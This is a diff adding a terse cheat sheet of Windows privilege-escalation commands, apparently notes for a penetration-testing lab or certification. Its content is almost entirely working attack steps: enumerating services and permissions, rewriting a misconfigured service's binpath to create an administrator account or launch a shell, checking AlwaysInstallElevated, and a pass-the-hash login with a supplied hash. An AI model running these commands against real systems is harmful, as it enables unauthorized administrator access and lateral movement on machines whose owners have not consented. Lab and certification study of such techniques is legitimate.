@@ -1,0 +1,57 @@
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"  
+
+net start  - get services
+tasklist /v   - get tasks
+dir *bob*.* /s   - locate a file
+cacls "C:\path\to\file.exe"   - check perms win xp and lower
+icacls   - Windows vista and up
+tasklist /v
+accesschk_v5.02.exe -qwcu "Authenticated Users" *
+
+Weak Service Perms:
+accesschk.exe -qwcu "Authenticated Users" *
+accesschk.exe -qwcu "Users" *
+accesschk.exe -qwcu "Everyone" *
+if there isn't accesschk, upload it (/usr/share/windows-binary/)
+make sure to use "-accepteula" parameter
+
+Edit binary misconfigured service:
+Get service
+sc config service.exe(Or no exe extention) binpath= "net user offsec password123 /add"
+sc start service.exe
+sc config service.exe binpath= "net localgroup administrators offsec password123 /add"
+sc start service.exe
+
+OR Can move file and add shell in the file location with same filename, and restart service
+
+If this does not work.. try executing a shell instead
+sc config service binpath= "C:\path\shell.exe"
+sc config service obj= ".\LocalSystem" password= ""
+sc start service
+
+Restart service:
+wmic service NAMEOFSERVICE call startservice
+net stop [service name] && net start [service name]  
+
+AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+exploit/windows/local/always_install_elevated
+
+
+C:\Windows\System32\eula.txt
+
+C:\Windows\System32\License.rtf
+
+Can be found for all these Windows operating systems
+
+Vista, W7, W8, W8.1
+
+
+Pass the hash:
+root@kali:~# export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896  
+
+root@kali:~# pth-winexe -U administrator% //10.11.01.76 cmd 
+
+If you have admin access on a Windows box but want to upgrade to NT Authority/SYSTEM access, simply obtain a meterpreter session and run the getsystem command.  
